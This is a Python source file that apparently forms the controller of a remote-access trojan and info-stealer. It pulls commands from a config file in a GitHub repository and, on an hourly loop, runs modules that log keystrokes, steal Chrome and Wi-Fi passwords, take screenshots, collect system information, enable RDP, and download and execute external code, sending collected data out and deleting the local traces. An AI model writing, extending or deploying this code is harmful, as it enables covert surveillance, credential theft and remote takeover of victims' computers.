from screenshot import screenshot
from sysinfo import sysinfo
from keylogger import keylogger
from chromepasswords import chromepasswords
from wifipasswords import wifipasswordextractor
from externalcode import download_and_execute
from rdp import RDPEnabler
import base64
import json
import requests
from typing import Dict
from dotenv import load_dotenv
import os
import time

load_dotenv()

#GLOBALS
RUN_TIME = 3600
REPO = os.getenv("repo")
CONFIG_FILE = os.getenv("config-file")
STOP = False

def fetch_config(repo_url: str, config_file: str) -> dict:
    # Fetches the config file from a GitHub repository and returns its contents as a dictionary.
    api_url = f"https://api.github.com/repos/{repo_url}/contents/{config_file}"
    response = requests.get(api_url)
    response.raise_for_status()
    content = response.json()["content"]
    decoded_content = base64.b64decode(content).decode("utf-8")
    config = json.loads(decoded_content)
    
    return config

def run_functions(repo_url: str, config_file: str):
    # Fetches the config file from a GitHub repository and executes the functions listed in the file.
    config = fetch_config(repo_url, config_file)
    
    for function_name, function_data in config.items():
        if function_name == "variables":
            continue
        
        parameters = function_data.get("parameters", {})  # Get the parameters for the function
        
        if '.' in function_name:
            class_name, method_name = function_name.split('.')
            cls = globals()[class_name]()
            method = getattr(cls, method_name)
            method(**parameters)  # Pass the parameters as keyword arguments to the method
        else:
            globals()[function_name](**parameters)  # Pass the parameters as keyword arguments to the function


def mod_keylogger():
    # Keylogger duration is set to 10s:
    k = keylogger(duration=10)
    k.start()
    k.sendfile()
    k.remove()

def mod_chromepasswords():
    cp = chromepasswords()
    cp.get_passwords()
    cp.write_passwords()
    cp.send_passwords()
    cp.remove()

def mod_rdp():
    rdp = RDPEnabler()
    rdp.enable_rdp()

def mod_screenshot():
    s = screenshot()
    s.save()
    s.send()
    s.remove()

def mod_systeminfo():
    s = sysinfo()
    s.getInfo()
    s.write()
    s.send()
    s.remove()

def mod_wifipasswords():
    wp = wifipasswordextractor()
    wp.extract_passwords()
    wp.write()
    wp.send()
    wp.remove()

def mod_downloadexecute(repository_url, file_path):
    if not (repository_url == "" or file_path == ""):
        download_and_execute(repository_url, file_path)

def stop():
    STOP = True

def main():
    mod_systeminfo()
    while True and not STOP:
        run_functions(REPO, CONFIG_FILE)
        time.sleep(RUN_TIME)

main()